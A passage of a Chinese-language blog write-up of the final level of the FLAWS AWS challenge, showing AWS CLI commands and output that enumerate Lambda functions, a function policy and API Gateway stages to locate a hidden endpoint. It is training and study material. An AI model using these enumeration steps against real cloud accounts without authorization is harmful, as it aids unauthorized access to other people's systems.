+<p>发现了这个用户允许使用<code>GET</code>方法访问资源<code>arn:aws:apigateway:us-west-2::/restapis/*</code>。<code>apigateway</code>通常与<code>Lambda</code>函数放在一起使用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --region us-west-2 --profile flawslevel6 lambda list-functions</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Functions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;TracingConfig&quot;: &#123;</span><br><span class="line">                &quot;Mode&quot;: &quot;PassThrough&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Version&quot;: &quot;$LATEST&quot;,</span><br><span class="line">            &quot;CodeSha256&quot;: &quot;2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=&quot;,</span><br><span class="line">            &quot;FunctionName&quot;: &quot;Level6&quot;,</span><br><span class="line">            &quot;MemorySize&quot;: 128,</span><br><span class="line">            &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;,</span><br><span class="line">            &quot;CodeSize&quot;: 282,</span><br><span class="line">            &quot;FunctionArn&quot;: &quot;arn:aws:lambda:us-west-2:975426262029:function:Level6&quot;,</span><br><span class="line">            &quot;Handler&quot;: &quot;lambda_function.lambda_handler&quot;,</span><br><span class="line">            &quot;Role&quot;: &quot;arn:aws:iam::975426262029:role/service-role/Level6&quot;,</span><br><span class="line">            &quot;Timeout&quot;: 3,</span><br><span class="line">            &quot;LastModified&quot;: &quot;2017-02-27T00:24:36.054+0000&quot;,</span><br><span class="line">            &quot;Runtime&quot;: &quot;python2.7&quot;,</span><br><span class="line">            &quot;Description&quot;: &quot;A starter AWS Lambda function.&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在一个<code>FunctionName</code>叫做Level6，继续详细查看这个策略：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws --region us-west-2 --profile flawslevel6 lambda get-policy --function-name Level6</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &quot;&#123;\&quot;Version\&quot;:\&quot;2012-10-17\&quot;,\&quot;Id\&quot;:\&quot;default\&quot;,\&quot;Statement\&quot;:[&#123;\&quot;Sid\&quot;:\&quot;904610a93f593b76ad66ed6ed82c0a8b\&quot;,\&quot;Effect\&quot;:\&quot;Allow\&quot;,\&quot;Principal\&quot;:&#123;\&quot;Service\&quot;:\&quot;apigateway.amazonaws.com\&quot;&#125;,\&quot;Action\&quot;:\&quot;lambda:InvokeFunction\&quot;,\&quot;Resource\&quot;:\&quot;arn:aws:lambda:us-west-2:975426262029:function:Level6\&quot;,\&quot;Condition\&quot;:&#123;\&quot;ArnLike\&quot;:&#123;\&quot;AWS:SourceArn\&quot;:\&quot;arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\&quot;&#125;&#125;&#125;]&#125;&quot;,</span><br><span class="line">    &quot;RevisionId&quot;: &quot;22f08307-9080-4403-bf4d-481ddc8dcb89&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现<code>arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\</code>这样一串有趣的资源信息，其中<code>s33ppypa75</code>为<code>rest-api-id</code>，利用这个信息，进一步查看，得到<code>&quot;stageName&quot;: &quot;Prod&quot;</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~$ aws --profile flawslevel6 --region us-west-2 apigateway get-stages --rest-api-id &quot;s33ppypa75&quot;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;item&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;tracingEnabled&quot;: false,</span><br><span class="line">            &quot;stageName&quot;: &quot;Prod&quot;,</span><br><span class="line">            &quot;cacheClusterEnabled&quot;: false,</span><br><span class="line">            &quot;cacheClusterStatus&quot;: &quot;NOT_AVAILABLE&quot;,</span><br><span class="line">            &quot;deploymentId&quot;: &quot;8gppiv&quot;,</span><br><span class="line">            &quot;lastUpdatedDate&quot;: 1488155168,</span><br><span class="line">            &quot;createdDate&quot;: 1488155168,</span><br><span class="line">            &quot;methodSettings&quot;: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据AWS的资源端点规则：<code>https://&lt;rest-api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com/&lt;stage-name&gt;/&lt;lambda function&gt;</code>，可以得到最终的资源点位于：<a target="_blank" rel="noopener" href="https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6">https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</a> 。在浏览器中访问地址，返回一串文字：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/</span><br></pre></td></tr></table></figure>
+
+<p>访问给出的网址，成功通关level 6，至此多有挑战全部通关完成：</p>
+<p><img src="https://p2.ssl.qhimg.com/t01e05395f18458bd2d.png" srcset="/img/loading.gif"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过FLAWS的挑战，对涉及到AWS的有关漏洞进行了实践学习，从安全运维人员的角度，可以避免踩坑，配置合理的内容和权限，从漏洞发现挖掘的角度，可以在漏洞发现过程中，尝试可能存在的隐患点、漏洞点，说不定有意外之喜。</p>
+<p>作为一个小白，这篇FLAWS通关记，是为了记录和分享自己的学习过程，分析记录的不到位的地方，还请大佬们收下留情 =）</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/aws/">aws</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/09/22/Hack-the-box-Sniper/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hack the box: Sniper</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/10/02/google_ctf_2019_stage1_writeup_3/">
+                        <span class="hidden-mobile">goolge ctf 2019 stage1 writeup_part_3</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "FLAWS challenge&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":170,"height":340},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
